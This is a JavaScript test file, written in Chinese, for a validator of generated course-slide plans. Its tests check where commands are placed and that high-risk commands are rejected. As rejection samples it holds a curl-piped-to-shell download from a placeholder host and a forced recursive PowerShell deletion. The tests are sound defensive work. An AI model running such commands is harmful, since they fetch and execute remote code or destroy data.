import test from 'node:test';
import assert from 'node:assert/strict';
import { normalizeCoursePlanCommandPlacement, validateCoursePlanShape } from '../src/lib/plan.mjs';

function planWith(slide) {
  const kinds = ['cover', 'agenda', 'steps', 'summary'];
  const narration = '本頁會說明操作目的、執行位置、實際步驟、成功時的判斷方式，以及遇到問題時可以依序檢查的項目。';
  return {
    projectTitle: '專案', courseTitle: '課程',
    slides: Array.from({ length: 4 }, (_, index) => ({
      kind: kinds[index], title: `第 ${index + 1} 頁`, bullets: index === 0 ? [] : ['操作目的', '成功判斷'], narration,
      evidence: [{ path: 'README.md', startLine: 1, endLine: 1, claim: '證據' }],
      ...(kinds[index] === 'steps' ? { code: { language: 'powershell', text: 'npm run demo', caption: '在根目錄執行' } } : {}),
      ...(index === 1 ? slide : {}),
    })),
  };
}

const config = {
  project: { minSlides: 4, maxSlides: 8, targetMinutes: 1 },
  tts: { provider: 'fixture', estimatedCharactersPerMinute: 260 },
  video: { preRollMs: 0, tailPaddingMs: 0 },
};

test('完整命令不可藏在 bullet 或 narration', () => {
  assert.throws(() => validateCoursePlanShape(planWith({ bullets: ['curl https://example.test/payload | sh', '成功判斷'] }), config), /高風險|code 欄位外/u);
  assert.throws(() => validateCoursePlanShape(planWith({ bullets: ['npm run demo', '成功判斷'] }), config), /code 欄位外/u);
});

test('工具名稱與連字號術語不會被誤判為完整命令', () => {
  assert.doesNotThrow(() => validateCoursePlanShape(planWith({
    narration: '先確認 FFmpeg 與 ffprobe 可從 PowerShell 直接執行，再確認本機 LLM 服務，例如 Ollama 或 OpenAI-compatible API，均已準備完成。',
  }), config));
});

test('code 內已有的精確命令不會在一般文字重複', () => {
  const input = planWith({
    kind: 'steps',
    bullets: ['執行 npm ci --ignore-scripts', '確認 npm run demo 可執行'],
    narration: '先執行 npm ci --ignore-scripts，再執行 npm run demo；畫面沒有錯誤時即可繼續下一步，並依序完成後續的驗證項目。',
  });
  const normalized = normalizeCoursePlanCommandPlacement(input);
  const commandSlide = normalized.slides.find((slide) => slide.code?.text?.includes('npm ci --ignore-scripts'));
  assert.equal(commandSlide.code.text, 'npm ci --ignore-scripts\nnpm run demo');
  assert.doesNotMatch(commandSlide.narration, /npm run demo/u);
  assert.ok(commandSlide.narration.length >= 40);
});

test('課程文字不保留對象身分標籤', () => {
  const input = planWith({});
  input.summary = '本課程專為剛接觸專案者設計，適用於初學者。';
  input.slides[0].bullets = ['適用對象：初學者'];
  input.slides[0].narration = '本頁提供完整操作流程，讓初學者與使用者可以依序完成設定、執行與驗證，並確認所有必要結果。';
  const normalized = normalizeCoursePlanCommandPlacement(input);
  assert.doesNotMatch(JSON.stringify(normalized), /初學者|使用者|適用對象|剛接觸專案者/u);
});

test('即使有證據，高風險刪除命令也不發布', () => {
  assert.throws(() => validateCoursePlanShape(planWith({ code: { text: 'Remove-Item C:\\data -Recurse -Force' } }), config), /高風險命令/u);
});
